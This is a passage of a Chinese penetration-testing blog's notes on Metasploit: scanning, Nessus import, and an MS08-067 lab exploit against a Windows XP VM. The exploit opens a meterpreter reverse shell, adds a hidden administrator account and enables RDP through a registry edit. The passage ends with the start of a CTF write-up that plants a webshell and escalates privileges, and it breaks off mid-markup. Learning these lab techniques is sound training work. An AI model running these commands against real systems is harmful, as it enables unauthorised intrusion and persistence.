id=\"Metasploit使用数据库\"><a href=\"#Metasploit使用数据库\" class=\"headerlink\" title=\"Metasploit使用数据库\"></a>Metasploit使用数据库</h3><h4 id=\"连接数据库\"><a href=\"#连接数据库\" class=\"headerlink\" title=\"连接数据库\"></a>连接数据库</h4><p>Metasploit提供多种数据库的支持，帮助渗透测试人员在进行复杂渗透测试工作时记录操作</p>\n<p>以PostgreSQL为例</p>\n<p>启动数据库子系统</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;etc&#x2F;init.d&#x2F;postgresql start</span><br></pre></td></tr></table></figure>\n\n<p>连接数据库需要用户名，密码，主机名以及想要使用的数据库名，postgresql的默认用户名是postgres，密码是toor，如忘记密码，可输入命令<code>sudo -u postgres psql</code>登录postgresql，再输入<code>ALTER USER postgres WITH PASSWORD &#39;newpassword&#39;;</code>修改密码即可</p>\n<p>在metasploit中和postgresql使用msf作为数据库名建立连接</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">db_connect postgres:password@127.0.0.1&#x2F;msf</span><br></pre></td></tr></table></figure>\n\n<p>待metasploit生成必须数据表后会返回终端指令符等待指令</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200722225301.png\" alt=\"\"></p>\n<p>执行<code>db_status</code>命令确认数据连接是否正确</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200722225416.png\" alt=\"\"></p>\n<h4 id=\"将数据导入metasploit\"><a href=\"#将数据导入metasploit\" class=\"headerlink\" title=\"将数据导入metasploit\"></a>将数据导入metasploit</h4><p>执行nmap生成基本xml报告</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">nmap -Pn -sS -A -oX data.xml 192.168.48.0&#x2F;24</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200722225937.png\" alt=\"\"></p>\n<p>执行<code>db_import</code>命令将文件导入数据库中</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200722230042.png\" alt=\"\"></p>\n<p>执行<code>hosts</code>命令核实导入的结果</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200722230126.png\" alt=\"\"></p>\n<p>如果想删除数据库中的数据，可以使用<code>hosts -d</code>删除现有的数据</p>\n<h3 id=\"高级扫描技巧：TCP空闲扫描\"><a href=\"#高级扫描技巧：TCP空闲扫描\" class=\"headerlink\" title=\"高级扫描技巧：TCP空闲扫描\"></a>高级扫描技巧：TCP空闲扫描</h3><p>这种扫描让我们冒充网络上另一台主机的IP地址，对目标进行更为隐秘的扫描</p>\n<p>使用metasploit框架的<code>scanner/ip/ipidseq</code>模块寻找满足TCP空闲扫描要求的空闲主机</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200722230602.png\" alt=\"\"></p>\n<p>RHOSTS参数可以使用IP段(如192.168.1.100-192.168.1.200)，也可以使用CIDR(无类型域间选路)地址块(如192.168.1.0/24)和多个CIDR地址块(192.168.1.0/24，192.168.2.0/24)，以及每行包含一个ip地址的IP列表文本文件</p>\n<p>THREADS设定扫描的线程数</p>\n<p>现在将RHOSTS设定为192.168.48.0/24，THREADS设定为50运行扫描</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200722231324.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200722231344.png\" alt=\"\"></p>\n<p>Incremental代表IP帧标识发生断档即该主机可用于空闲扫描，在nmap中使用<code>-sI</code>选项指定扫描获取的192.168.48.2作为空闲主机对目标主机进行扫描</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200722231924.png\" alt=\"\"></p>\n<h3 id=\"在MSF终端中运行nmap\"><a href=\"#在MSF终端中运行nmap\" class=\"headerlink\" title=\"在MSF终端中运行nmap\"></a>在MSF终端中运行nmap</h3><p>metasploit能够和nmap结合使用，首先保证数据库连接成功</p>\n<p>输入<code>db_nmap</code>命令，它能使得MSF运行nmap并自动将nmap结果存储到msf数据库中</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200722232638.png\" alt=\"\"></p>\n<p>可以执行<code>services</code>命令查看数据库中关于系统运行服务的扫描结果</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200722232746.png\" alt=\"\"></p>\n<h3 id=\"使用metasploit进行端口扫描\"><a href=\"#使用metasploit进行端口扫描\" class=\"headerlink\" title=\"使用metasploit进行端口扫描\"></a>使用metasploit进行端口扫描</h3><p>除了使用nmap等第三方扫描器，metaspliot的辅助模块中也包含了几款内建的端口扫描器</p>\n<p>执行<code>search portscan</code>命令查看metasploit框架提供的端口扫描工具</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200722233541.png\" alt=\"\"></p>\n<p>使用syn端口扫描器对单个主机进行扫描</p>\n<p>输入<code>use scanner/portscan/syn</code>，设定RHOSTS和THREADS执行扫描</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200722235703.png\" alt=\"\"></p>\n<h3 id=\"针对性扫描\"><a href=\"#针对性扫描\" class=\"headerlink\" title=\"针对性扫描\"></a>针对性扫描</h3><p>针对性扫描是指寻找目标网络中存在的已知可利用漏洞或能够轻松获取后门的特定操作系统，服务，软件以及配置缺陷</p>\n<h4 id=\"服务器消息块协议扫描\"><a href=\"#服务器消息块协议扫描\" class=\"headerlink\" title=\"服务器消息块协议扫描\"></a>服务器消息块协议扫描</h4><p>Metasploit可以利用它的smb_version模块来遍历一个网络并获取windows系统的版本号</p>\n<p>执行扫描如下：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200723203548.png\" alt=\"\"></p>\n<h4 id=\"搜寻配置不当的Microsoft-SQL-Server\"><a href=\"#搜寻配置不当的Microsoft-SQL-Server\" class=\"headerlink\" title=\"搜寻配置不当的Microsoft SQL Server\"></a>搜寻配置不当的Microsoft SQL Server</h4><p>MS SQL通常作为常用软件如(Microsoft Visual Studio)安装的先决条件被自动的安装在系统上，导致很多管理员会忽略该服务软件的存在，如此一来，这种情况下安装的MS SQL服务器软件通常没有实际的用处，也很少安装补丁程序</p>\n<p>MS SQ:安装后默认监听在TCP端口1433或使用随机的动态TCP端口，Metaspliot提供了一个mssql_ping模块帮助你找到MS SQL服务器监听的TCP端口</p>\n<p>执行扫描如下：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200723204619.png\" alt=\"\"></p>\n<h4 id=\"SSH服务器扫描\"><a href=\"#SSH服务器扫描\" class=\"headerlink\" title=\"SSH服务器扫描\"></a>SSH服务器扫描</h4><p>使用ssh_version模块识别目标服务器上运行的SSH版本</p>\n<p>执行如下：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200723205209.png\" alt=\"\"></p>\n<h4 id=\"FTP扫描\"><a href=\"#FTP扫描\" class=\"headerlink\" title=\"FTP扫描\"></a>FTP扫描</h4><p>FTP服务器通常是进入一个目标网络最便捷的途径，使用ftp_version模块对FTP服务进行扫描</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200723212827.png\" alt=\"\"></p>\n<p>成功识别FTP服务器，之后可以使用scanner/ftp/anonymous模块检查一下这台FTP服务器是否允许匿名用户登录</p>\n<h4 id=\"简单网管协议扫描\"><a href=\"#简单网管协议扫描\" class=\"headerlink\" title=\"简单网管协议扫描\"></a>简单网管协议扫描</h4><p>简单网管协议(SNMP)通常用于网络设备中，用来报告带宽利用率、冲突率和以及其他信息，但一些操作系统也包含SNMP服务器软件，主要用来提供类似CPU利用率、空闲内存和其他系统状态</p>\n<p>可访问的SNMP服务器能够泄露某些特点系统的相当多的信息，甚至导致设备被远程攻陷。例如，如果能得到既有可读可写的Cisco路由器SNMP团体字符串，便可以下载整个路由器的配置，对其进行i修改并传回路由器中</p>\n<p>Metasploit框架中包含一个内置的辅助模块scanner/snmp/snmp_enum。我们可以尝试对一个ip或一段ip使用字典来猜解SNMP团体字符串。</p>\n","categories":["渗透测试"],"tags":["metasploit"]},{"title":"metasploit配合nessus","url":"/2020/07/24/msf_note2/","content":"<h3 id=\"基本的漏洞扫描\"><a href=\"#基本的漏洞扫描\" class=\"headerlink\" title=\"基本的漏洞扫描\"></a>基本的漏洞扫描</h3><a id=\"more\"></a>\n\n<h4 id=\"使用nessus进行扫描\"><a href=\"#使用nessus进行扫描\" class=\"headerlink\" title=\"使用nessus进行扫描\"></a>使用nessus进行扫描</h4><p>安装配置nessus，官网下载对应版本安装：<a href=\"http://www.tenable.com/products/nessus/nessus-plugins/obtain-an-activation-code\" target=\"_blank\" rel=\"noopener\">http://www.tenable.com/products/nessus/nessus-plugins/obtain-an-activation-code</a></p>\n<p>获取激活码激活，创建用户名并进行安装</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200724104530.png\" alt=\"\"></p>\n<p>创建Nessus扫描策略，自定义Plugins</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200724110548.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200724133724.png\" alt=\"\"></p>\n<p>新建扫描</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200724133810.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200724133931.png\" alt=\"\"></p>\n<p>开始任务，等待一会扫描完毕</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200724214933.png\" alt=\"\"></p>\n<h4 id=\"将扫描结果导入Metaspliot框架中\"><a href=\"#将扫描结果导入Metaspliot框架中\" class=\"headerlink\" title=\"将扫描结果导入Metaspliot框架中\"></a>将扫描结果导入Metaspliot框架中</h4><p>保持数据库连接状态</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200724175613.png\" alt=\"\"></p>\n<p>点击export导出报告文件，生成以.nessus的可以被metasploit解析的格式</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200724175729.png\" alt=\"\"></p>\n<p>使用<code>db_import</code>命令将文件导入数据库中</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200724181109.png\" alt=\"\"></p>\n<p>执行hosts命令验证主机和漏洞数据是否导入，这里生成简要列表，包含了ip，探测到的服务数量以及漏洞数量</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200724181509.png\" alt=\"\"></p>\n<p>如果想显示详细的漏洞列表，可以输入不包含任何参数的vulns命令</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200724181721.png\" alt=\"\"></p>\n<h4 id=\"Metasploit使用Nessus扫描\"><a href=\"#Metasploit使用Nessus扫描\" class=\"headerlink\" title=\"Metasploit使用Nessus扫描\"></a>Metasploit使用Nessus扫描</h4><p>执行<code>load nessus</code>命令载入Nessus插件</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200724182623.png\" alt=\"\"></p>\n<p><code>nessus_help</code>查看Nessus插件支持的命令</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200724182720.png\" alt=\"\"></p>\n<p>开始扫描前，必须使用<code>nessus connect username:password@127.0.0.1:8843</code>命令登录到你的Nessus服务器上</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200724184540.png\" alt=\"\"></p>\n<p>启动扫描时需要指定一个已经定义的扫描策略的ID号，可以使用<code>nessus_policy_list</code>列出服务器上所有已经定义的扫描策略</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200724184809.png\" alt=\"\"></p>\n<p>输入<code>nessus_scan_new</code>命令，并在后面加上扫描策略的ID号、扫描任务的名字、任务描述以及目标的IP地址</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200724190018.png\" alt=\"\"></p>\n<p>这里出现本来出现了错误，后来参考了<a href=\"https://github.com/rapid7/metasploit-framework/issues/11117找到解决方法\" target=\"_blank\" rel=\"noopener\">https://github.com/rapid7/metasploit-framework/issues/11117找到解决方法</a></p>\n<p>创建好扫描之后输入<code>nessus_scan_launch ID</code>执行扫描任务</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200724190248.png\" alt=\"\"></p>\n<p>running代表正在执行，completed代表扫描结束</p>\n<p>扫描结束后，可以使用<code>nessus_db_import</code>命令将指定扫描任务的报告导入到Metasploit数据库中</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200724190548.png\" alt=\"\"></p>\n<p>同样可以使用<code>host</code>命令查看数据</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200724190708.png\" alt=\"\"></p>\n","categories":["渗透测试"],"tags":["metasploit","nessus"]},{"title":"metasploit渗透实例","url":"/2020/07/26/msf_note3/","content":"<h3 id=\"渗透测试基础\"><a href=\"#渗透测试基础\" class=\"headerlink\" title=\"渗透测试基础\"></a>渗透测试基础</h3><h4 id=\"Metasploit基本命令\"><a href=\"#Metasploit基本命令\" class=\"headerlink\" title=\"Metasploit基本命令\"></a>Metasploit基本命令</h4><p><strong>show exploits</strong>：显示Metasploit框架中所有可用的渗透攻击模块<br><strong>show auxiliary</strong>：显示所有辅助模块以及他们的用途<br><strong>show options</strong>：列出当前模块所需的各种参数，如果当前没有选择模块，则显示所有的全局参数<br><strong>back</strong>：返回Metasploit的上一个状态，常用于修改某个参数之后<br><strong>search</strong>：查找某个特定的渗透攻击，辅助或者攻击载荷模块<br><strong>show payloads</strong>：显示与当前模块兼容的可用攻击载荷<br><strong>show target</strong>：模块下列出受到漏洞影响的目标系统的类型<br><strong>info</strong>：可以加上模块的名字显示目标模块的详细信息，参数说明以及可用的系统类型，如果已选择了模块，直接在提示符下输入info即可<br><strong>set和unset</strong>：Metasploit模块中所有参数只有set和unset两个状态，输入show options可以查看哪些参数是必填的，使用set命令对某个参                     数进行设置，使用unset命令可以禁用相关参数<br><strong>steg和unsetg</strong>：对全局参数进行设置或清除，使用这组命令可以让你不必每次遇见某个参数都要重新设置<br><strong>save</strong>：可以在任何时候输入save命令以保存当前状态，例如使用steg对参数进行设置后save，这样下次启动msf时还能使用这些设置值</p>\n<h3 id=\"一次完整的msf渗透攻击\"><a href=\"#一次完整的msf渗透攻击\" class=\"headerlink\" title=\"一次完整的msf渗透攻击\"></a>一次完整的msf渗透攻击</h3><p>攻击机：kali linux<br>靶机：windows xp sp2<br>利用安全漏洞：MS08-067</p>\n<blockquote>\n<p>MS08-067漏洞将会影响除Windows Server 2008 Core以外的所有Windows系统，包括：Windows 2000/XP/Server 2003/Vista/Server 2008的各个版本，甚至还包括测试阶段的Windows 7 Pro-Beta。这些操作系统服务器服务中的漏洞可能允许远程执行代码</p>\n</blockquote>\n<h4 id=\"nmap扫描\"><a href=\"#nmap扫描\" class=\"headerlink\" title=\"nmap扫描\"></a>nmap扫描</h4><p>msf中执行</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">nmap -sT -A --script&#x3D;smb-vuln-ms08-067 -P0 192.168.48.134</span><br></pre></td></tr></table></figure>\n\n<p><code>-sT</code>是指隐秘的TCP连接扫描，<code>-A</code>指高级操作系统探测功能，<code>--script=smb-vuln-ms08-067</code>是用到了nmap的插件，<code>-P0</code>是指无ping扫描</p>\n<p>扫描结果如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">msf5 &gt; nmap -sT -A --script&#x3D;smb-vuln-ms08-067 -P0 192.168.48.134</span><br><span class=\"line\">[*] exec: nmap -sT -A --script&#x3D;smb-vuln-ms08-067 -P0 192.168.48.134</span><br><span class=\"line\"></span><br><span class=\"line\">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-07-26 02:45 EDT</span><br><span class=\"line\">Nmap scan report for 192.168.48.134</span><br><span class=\"line\">Host is up (0.00085s latency).</span><br><span class=\"line\">Not shown: 997 closed ports</span><br><span class=\"line\">PORT    STATE SERVICE      VERSION</span><br><span class=\"line\">135&#x2F;tcp open  msrpc        Microsoft Windows RPC</span><br><span class=\"line\">139&#x2F;tcp open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class=\"line\">445&#x2F;tcp open  microsoft-ds Microsoft Windows XP microsoft-ds</span><br><span class=\"line\">MAC Address: 00:0C:29:47:58:93 (VMware)</span><br><span class=\"line\">Device type: general purpose</span><br><span class=\"line\">Running: Microsoft Windows XP|2003</span><br><span class=\"line\">OS CPE: cpe:&#x2F;o:microsoft:windows_xp::sp2:professional cpe:&#x2F;o:microsoft:windows_server_2003</span><br><span class=\"line\">OS details: Microsoft Windows XP Professional SP2 or Windows Server 2003</span><br><span class=\"line\">Network Distance: 1 hop</span><br><span class=\"line\">Service Info: OSs: Windows, Windows XP; CPE: cpe:&#x2F;o:microsoft:windows, cpe:&#x2F;o:microsoft:windows_xp</span><br><span class=\"line\"></span><br><span class=\"line\">Host script results:</span><br><span class=\"line\">| smb-vuln-ms08-067: </span><br><span class=\"line\">|   VULNERABLE:</span><br><span class=\"line\">|   Microsoft Windows system vulnerable to remote code execution (MS08-067)</span><br><span class=\"line\">|     State: VULNERABLE</span><br><span class=\"line\">|     IDs:  CVE:CVE-2008-4250</span><br><span class=\"line\">|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,</span><br><span class=\"line\">|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary</span><br><span class=\"line\">|           code via a crafted RPC request that triggers the overflow during path canonicalization.</span><br><span class=\"line\">|           </span><br><span class=\"line\">|     Disclosure date: 2008-10-23</span><br><span class=\"line\">|     References:</span><br><span class=\"line\">|       https:&#x2F;&#x2F;cve.mitre.org&#x2F;cgi-bin&#x2F;cvename.cgi?name&#x3D;CVE-2008-4250</span><br><span class=\"line\">|_      https:&#x2F;&#x2F;technet.microsoft.com&#x2F;en-us&#x2F;library&#x2F;security&#x2F;ms08-067.aspx</span><br><span class=\"line\"></span><br><span class=\"line\">TRACEROUTE</span><br><span class=\"line\">HOP RTT     ADDRESS</span><br><span class=\"line\">1   0.85 ms 192.168.48.134</span><br><span class=\"line\"></span><br><span class=\"line\">OS and Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 11.02 seconds</span><br></pre></td></tr></table></figure>\n\n<p>可以看到报告处确实发现了MS08-067漏洞并且VULNERABLE，提示我们可以进一步攻击</p>\n<h4 id=\"使用Metasploit获取shell\"><a href=\"#使用Metasploit获取shell\" class=\"headerlink\" title=\"使用Metasploit获取shell\"></a>使用Metasploit获取shell</h4><p>在Metasploit中找到可用于此漏洞的模块</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200726150553.png\" alt=\"\"></p>\n<p>使用use加载这个模块</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200726150654.png\" alt=\"\"></p>\n<p>设置攻击载荷为基于Windows系统的Meterpreter reverse_tcp，这个载荷会在攻击成功后从目标主机发起一个反弹连接并连接到LHOST中指定的IP地址，以此绕过防火墙的入站流量保护或者来穿透NAT网关</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200726151215.png\" alt=\"\"></p>\n<p>使用<code>show target</code>识别匹配该模块影响的操作系统类型并执行<code>set TARGET</code>指定目标操作系统类型（大多数MSF渗透模块会自动对目标系统类型进行识别而不需要手工指定此参数，但针对MS08-067漏洞的攻击中通常无法正确的识别出系统类型）</p>\n<p>我们指定操作系统类型为Windows XP SP2 Chinese - Simplified (NX)，NX即为’No Execute’，表示windows启用了<a href=\"https://www.dell.com/support/article/zh-cn/sln288643/%E4%BB%80%E4%B9%88%E6%98%AF%E6%95%B0%E6%8D%AE%E6%89%A7%E8%A1%8C%E4%BF%9D%E6%8A%A4-dep?lang=zh\" target=\"_blank\" rel=\"noopener\">DEP保护</a>，在Windows XP SP2中，DEP默认是启用的</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200726153331.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200726153350.png\" alt=\"\"></p>\n<p>通过<code>set RHOST</code>命令设置目标靶机IP地址，<code>set LHOST</code>设置反向连接地址为攻击机IP，<code>set LPORT</code>设置攻击机监听的TCP端口号，</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200726153946.png\" alt=\"\"></p>\n<p>如果不确定哪个tcp端口能够成功连接，可以使用msf内置的模块施行暴力猜接，使用<code>search reverse_tcp_allports</code>搜索</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200726164849.png\" alt=\"\"></p>\n<p>再<code>set payload windows/meterpreter/reverse_tcp_allports</code>即可，不过要注意最后执行攻击的时候是<code>exploit -j</code></p>\n<p>最后输入<code>show options</code>确认这些参数都设置正确</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Module options (exploit&#x2F;windows&#x2F;smb&#x2F;ms08_067_netapi):</span><br><span class=\"line\"></span><br><span class=\"line\">   Name     Current Setting  Required  Description</span><br><span class=\"line\">   ----     ---------------  --------  -----------</span><br><span class=\"line\">   RHOSTS   192.168.48.134   yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;</span><br><span class=\"line\">   RPORT    445              yes       The SMB service port (TCP)</span><br><span class=\"line\">   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Payload options (windows&#x2F;meterpreter&#x2F;reverse_tcp):</span><br><span class=\"line\"></span><br><span class=\"line\">   Name      Current Setting  Required  Description</span><br><span class=\"line\">   ----      ---------------  --------  -----------</span><br><span class=\"line\">   EXITFUNC  thread           yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)</span><br><span class=\"line\">   LHOST     192.168.48.128   yes       The listen address (an interface may be specified)</span><br><span class=\"line\">   LPORT     8080             yes       The listen port</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Exploit target:</span><br><span class=\"line\"></span><br><span class=\"line\">   Id  Name</span><br><span class=\"line\">   --  ----</span><br><span class=\"line\">   10  Windows XP SP2 Chinese - Simplified (NX)</span><br></pre></td></tr></table></figure>\n\n<p>输入<code>exploit</code>初始化攻击环境并开始攻击</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">msf5 exploit(windows&#x2F;smb&#x2F;ms08_067_netapi) &gt; exploit </span><br><span class=\"line\"></span><br><span class=\"line\">[*] Started reverse TCP handler on 192.168.48.128:8080 </span><br><span class=\"line\">[*] 192.168.48.134:445 - Attempting to trigger the vulnerability...</span><br><span class=\"line\">[*] Sending stage (180291 bytes) to 192.168.48.134</span><br><span class=\"line\">[*] Meterpreter session 1 opened (192.168.48.128:8080 -&gt; 192.168.48.134:1055) at 2020-07-26 03:42:03 -0400</span><br><span class=\"line\"></span><br><span class=\"line\">meterpreter &gt;</span><br></pre></td></tr></table></figure>\n\n<p>可以看到这次攻击是成功的，它为我们返回了一个reverse_tcp方式的Metasploit攻击载荷会话，此时可以使用<code>sessions &lt;ID&gt;</code>命令查看远程运行的Meterpreter情况</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200726162743.png\" alt=\"\"></p>\n<p>直接执行shell命令会把我们直接带到命令提示符状态栏下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">meterpreter &gt; shell </span><br><span class=\"line\">Process 2028 created.</span><br><span class=\"line\">Channel 1 created.</span><br><span class=\"line\">Microsoft Windows XP [�汾 5.1.2600]</span><br><span class=\"line\">(C) ��Ȩ���� 1985-2001 Microsoft Corp.</span><br><span class=\"line\"></span><br><span class=\"line\">C:\\WINDOWS\\system32&gt;whoami</span><br><span class=\"line\">whoami</span><br><span class=\"line\">&#39;whoami&#39; �����ڲ����ⲿ���Ҳ���ǿ����еĳ���</span><br><span class=\"line\">���������ļ���</span><br><span class=\"line\"></span><br><span class=\"line\">C:\\WINDOWS\\system32&gt;ipconfig</span><br><span class=\"line\">ipconfig</span><br><span class=\"line\"></span><br><span class=\"line\">Windows IP Configuration</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Ethernet adapter ��������:</span><br><span class=\"line\"></span><br><span class=\"line\">        Connection-specific DNS Suffix  . : localdomain</span><br><span class=\"line\">        IP Address. . . . . . . . . . . . : 192.168.48.134</span><br><span class=\"line\">        Subnet Mask . . . . . . . . . . . : 255.255.255.0</span><br><span class=\"line\">        Default Gateway . . . . . . . . . : 192.168.48.2</span><br><span class=\"line\"></span><br><span class=\"line\">C:\\WINDOWS\\system32&gt;</span><br></pre></td></tr></table></figure>\n\n<p>之所以乱码，是因为kali中不支持windows的编码，一般可以通过命令<code>chcp 65001</code>解决，但这里不知道为啥解决不了，可能是会话不稳定导致</p>\n<h4 id=\"进一步渗透\"><a href=\"#进一步渗透\" class=\"headerlink\" title=\"进一步渗透\"></a>进一步渗透</h4><p>使用<code>net user host$ /add</code>命令添加一个隐藏用户host$</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200726161023.png\" alt=\"\"></p>\n<p><code>net user</code>查看用户</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200726161150.png\" alt=\"\"></p>\n<p><code>net user host$ password</code>为用户设置密码</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200726161414.png\" alt=\"\"></p>\n<p><code>net localgroup administrators host$ /add</code>将用户加到administrators组中提升该用户权限，再次<code>net user host$</code>查看该用户可以看到用户组已经改变</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200726161536.png\" alt=\"\"></p>\n<p>利用kali自带的远程连接工具登录靶机，发生错误</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200726161749.png\" alt=\"\"></p>\n<p>解决方法是在msf中输入如下命令开启终端服务</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f</span><br></pre></td></tr></table></figure>\n\n<p>再次连接发现成功开启窗口</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200726162005.png\" alt=\"\"></p>\n<p>使用刚添加的用户进行登录</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200726162207.png\" alt=\"\"></p>\n<p>创建一个新用户验证权限</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200726162422.png\" alt=\"\"></p>\n<p>到此，一次简单完整的渗透攻击结束。</p>\n","categories":["渗透测试"],"tags":["metasploit"]},{"title":"i春秋刷题——综合渗透测试实验","url":"/2020/09/20/ichunqiu_sum/","content":"<h3 id=\"我很简单，请不要欺负我\"><a href=\"#我很简单，请不要欺负我\" class=\"headerlink\" title=\"我很简单，请不要欺负我\"></a>我很简单，请不要欺负我</h3><p>第一题awvs是一个漏洞扫描工具</p>\n<p>第二题：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200819093619.png\" alt=\"\"></p>\n<p>一个asp网站，用旁注检测工具检测到有注入</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200819105424.png\" alt=\"\"></p>\n<p>一把梭得到admin密码，md5解密得admin888</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200819105542.png\" alt=\"\"></p>\n<p>登录到后台</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200819105859.png\" alt=\"\"></p>\n<p>试着上传shell，把上传文件限制加上一条php，找下有没有上传点</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200819111142.png\" alt=\"\"></p>\n<p>无果，百度下，采用修改配置文件的方法获取WebShell</p>\n<p>在系统设置将网站首页改为一句话木马</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200819112528.png\" alt=\"\"></p>\n<p>菜刀连接inc/config.asp（配置文件位置），连接密码是#，成功getshell</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200819112709.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200819112805.png\" alt=\"\"></p>\n<p>应该是要获取服务器管理员密码，也就是提权。</p>\n<p>尝试pr提权，首先上传pr.exe到，那就先找有写入权限得目录</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200819113243.png\" alt=\"\"></p>\n<p>切换虚拟终端，拒绝访问，可能是被管理员移除了cmd，那么上传cmd.exe</p>\n<p><img 